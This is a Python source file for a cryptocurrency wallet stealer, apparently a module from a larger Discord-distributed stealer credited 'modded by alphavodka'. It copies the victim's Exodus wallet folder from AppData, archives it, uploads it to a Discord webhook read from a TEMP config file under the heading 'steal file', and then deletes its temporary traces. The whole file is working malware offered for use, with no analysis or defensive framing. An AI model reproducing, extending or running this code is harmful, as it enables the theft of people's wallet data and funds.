import os
from discord_webhook import DiscordWebhook, DiscordEmbed

def get_webhook():
    webhook_path = os.path.join(os.getenv("TEMP"), "config", "webhook.txt")
    if os.path.exists(webhook_path):
        with open(webhook_path, "r") as f:
            return f.read().strip()
    return None

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            try:
                with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                    f_write.write(f_read.read())
            except IOError as e:
                print(f"Failed to copy {src_path} to {dst_path}: {e}")

def exo():
    user = os.path.expanduser("~")
    exodus_path = os.path.join(user, "AppData", "Roaming", "Exodus")
    temp_exodus_path = os.path.join(os.getenv("TEMP"), "Exodus")
    temp_exodus_zip_path = os.path.join(os.getenv("TEMP"), "Exodus.zip")
    
    webhook_url = get_webhook()
    if not webhook_url:
        print("Webhook not found.")
        return
    
    if os.path.exists(exodus_path):
        copy_directory(exodus_path, temp_exodus_path)
        os.system(f"cd {temp_exodus_path} && tar -zcf {temp_exodus_zip_path} *")
        
        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title="steal file", description="everything was taken !", color=242424)
        embed.set_footer(text="join https://discord.gg/VqVRkzdGHg | modded by alphavodka")
        webhook.add_embed(embed)
        
        try:
            with open(temp_exodus_zip_path, "rb") as f:
                webhook.add_file(file=f.read(), filename='Exodus.zip')
            response = webhook.execute()
            if response.status_code != 200:
                print(f"Failed to upload file. Response: {response.content}")
        except Exception as e:
            print(f"Error during file upload: {e}")
        
        try:
            os.remove(temp_exodus_zip_path)
            for root, dirs, files in os.walk(temp_exodus_path, topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir(temp_exodus_path)
        except Exception as e:
            print(f"Cleanup failed: {e}")
    else:
        print("Source directory does not exist.")

exo()
